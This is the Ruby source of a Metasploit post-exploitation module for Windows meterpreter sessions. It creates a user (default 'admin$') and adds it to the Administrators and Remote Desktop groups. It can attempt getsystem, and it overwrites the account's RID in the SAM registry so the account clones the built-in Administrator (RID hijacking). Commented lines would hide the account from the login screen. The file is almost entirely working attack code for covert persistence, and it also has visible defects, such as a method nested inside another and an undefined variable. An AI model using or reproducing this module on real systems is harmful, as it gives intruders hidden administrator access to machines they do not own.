##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Priv
  include Msf::Post::File

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Manage Add User and Clone Administrator',
      'Description'   => %q(
          This module add a  user to the Administrator/Remote Desktop group. It will
        check if sufficient privileges are present for certain actions and run
        getprivs for system.
      ),
      'License'       => MSF_LICENSE,
      'Author'        => 'AnonySec',
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]))
    register_options(
      [
        OptBool.new('GETSYSTEM', [true, 'Attempt to get SYSTEM privilege on the target host.', false]),
        OptString.new('USERNAME',  [true,  'Add username and clone the administrator. (No Guest)', 'admin$']),
        OptString.new('PASSWORD',  [false, 'Password of the user,default random 8 bits.']),
        OptInt.new('RID', [true, 'RID to set to the specified account.', 500])
      ]
    )
  end

  def check_result(user_result)
    case user_result['return']
    # when client.railgun.const('ERROR_ACCESS_DENIED')
    #   print_error 'Insufficient privileges'
    when client.railgun.const('NERR_PasswordTooShort')
      print_error 'The password does not appear to be valid (too short, too long, too recent, etc.).'
    else
      print_error "Unexpectedly returned #{user_result}"
    end
  end

  def add_users
    if datastore['PASSWORD'].nil?
      datastore['PASSWORD'] = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2)
      print_status("You have not set up a PASSWORD. The default is '#{datastore['PASSWORD']}'")
    end
    #  Add user
    if enum_user.include? datastore['USERNAME']
      print_error("User '#{datastore['USERNAME']}' already exists.")
    else
      result = add_user(datastore['USERNAME'], datastore['PASSWORD'])
      if result['return'] == 0
        #print_good("User '#{datastore['USERNAME']}' was added.")
        print_good "\tAdding User: #{datastore['USERNAME']} with Password: #{datastore['PASSWORD']}"
      else
        check_result(result)
      end
    end

  #def add_group(username, password, cleanup_rc)
  def add_group
    begin

      rdu_sid = resolve_sid("S-1-5-32-555")
      admin_sid = resolve_sid("S-1-5-32-544")

      if !rdu_sid[:mapped] || !admin_sid[:mapped]
        print_error("\tThe Remote Desktop Users group is not mapped") if !rdu_sid[:mapped]
        print_error("\tThe Administrators group is not mapped") if !admin_sid[:mapped]
        print_error("\tNot adding user #{datastore['USERNAME']}")
        return
      end

      rdu = rdu_sid[:name]
      admin = admin_sid[:name]

      user_added = false
      result = add_user(datastore['USERNAME'], datastore['PASSWORD'])
      if result['return'] == 0
        user_added = true
      elsif check_user(datastore['USERNAME'])
        user_added = true
      end

      if user_added

        print_good "\tAdding User: #{datastore['USERNAME']} to local group '#{admin}'"
        add_members_localgroup(admin, datastore['USERNAME'])
        print_good "\tAdding User: #{datastore['USERNAME']} to local group '#{rdu}'"
        add_members_localgroup(rdu, datastore['USERNAME'])
        # print_good "\tHiding user from Windows Login screen"
        # hide_user_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'
        # registry_setvaldata(hide_user_key, datastore['USERNAME'], 0, "REG_DWORD")
      else
        print_error("Account could not be created")
        addusr_out.each_line do |l|
          print_error("\t#{l.chomp}")
        end
      end
    rescue StandardError => e
      print_status("The following Error was encountered: #{e.class} #{e}")
      end
    end
  end

# Clone account definition

  def getsystem
    results = session.priv.getsystem
    if results[0]
      return true
    else
      return false
    end
  end

  def get_name_from_rid(reg_key, rid, names_key)
    names_key.each do |name|
      skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
      rid_user = skey['Type']
      return name if rid_user == rid
    end
    return nil
  end

  def get_user_rid(reg_key, username, names_key)
    names_key.each do |name|
      next unless name.casecmp(username).zero?
      #print_good("Found #{name} account!")
      skey = registry_getvalinfo(reg_key + "\\Names\\#{name}", "")
      rid = skey['Type']
      if !skey
        print_error("Could not open user's key")
        return -1
      end
      return rid
    end
    return -1
  end

  def check_active(fbin)
    if fbin[0x38].unpack("H*")[0].to_i != 10
      return true
    else
      return false
    end
  end

  def swap_rid(fbin, rid)
    # This function will set hex format to a given RID integer
    hex = [format("%04x", rid).scan(/.{2}/).reverse.join].pack("H*")
    # Overwrite new RID at offset 0x30
    fbin[0x30, 2] = hex
    return fbin
  end

  def rid_hijack
    # Registry key to manipulate
    reg_key = 'HKLM\\SAM\\SAM\\Domains\\Account\\Users'

    # Load the usernames from SAM Registry key
    names_key = registry_enumkeys(reg_key + '\\Names')
    unless names_key
      print_error("Could not access to SAM registry keys")
      return
    end

    # If username is set, looks for it in SAM registry key
    user_rid = -1
    username = datastore['USERNAME']
    if datastore['GUEST_ACCOUNT']
      user_rid = 0x1f5
      print_status("Target account: Guest Account")
      username = get_name_from_rid(reg_key, user_rid, names_key)
    else
      if datastore['USERNAME'].to_s.empty?
        print_error("You must set an username or enable GUEST_ACCOUNT option")
        return
      end
      # print_status('Checking users...')
      print_status('Start cloning login account')
      user_rid = get_user_rid(reg_key, datastore['USERNAME'], names_key)
    end

    # Result of the RID harvesting
    if user_rid == -1
      print_error("Could not find the specified username")
      return
    else
      print_good("\tTarget account username: #{username}")
      print_good("\tTarget account RID: #{user_rid}")
    end

    # Search the Registry associated to the user's RID and overwrites it
    users_key = registry_enumkeys(reg_key)
    users_key.each do |r|
      next if r.to_i(16) != user_rid
      f = registry_getvaldata(reg_key + "\\#{r}", "F")

      print_good("\tOverwriting RID")

      # Overwrite RID to specified RID
      f = swap_rid(f, datastore['RID'])

      open_key = registry_setvaldata(reg_key + "\\#{r}", "F", f, "REG_BINARY")
      unless open_key
        print_error("Can't write to registry... Something's wrong!")
        return -1
      end
      print_good("\tThe RID #{datastore['RID']} is set to the account #{username} with original RID #{user_rid}")
    end
  end

  def run
    # Checks the Windows Version.
    wver = sysinfo["OS"]
    print_status("Target OS: #{wver}")
    # Checks privileges of the session, and tries to get SYSTEM privileges if needed.
    print_status("Checking for SYSTEM privileges on session")
    if !is_system?
      if datastore['GETSYSTEM']
        print_status("Trying to get SYSTEM privileges")
        if getsystem
          print_good("\tGet SYSTEM privileges")
        else
          print_error("Could not obtain SYSTEM privileges")
          return
        end
      else
        print_error("Session is not running with SYSTEM privileges. Try setting GETSYSTEM ")
        return
      end
    else
      print_good("\tSession is already running with SYSTEM privileges")
    end

    print_status "Start setting login account"
    add_users
    add_group
    rid_hijack

    print_status("For cleanup execute Meterpreter command: execute -H -f cmd.exe -a '/c net user #{datastore['USERNAME']} /delete'")

    return nil
  end

  def check_user(user)
    enum_user.include?(user)
  end
end
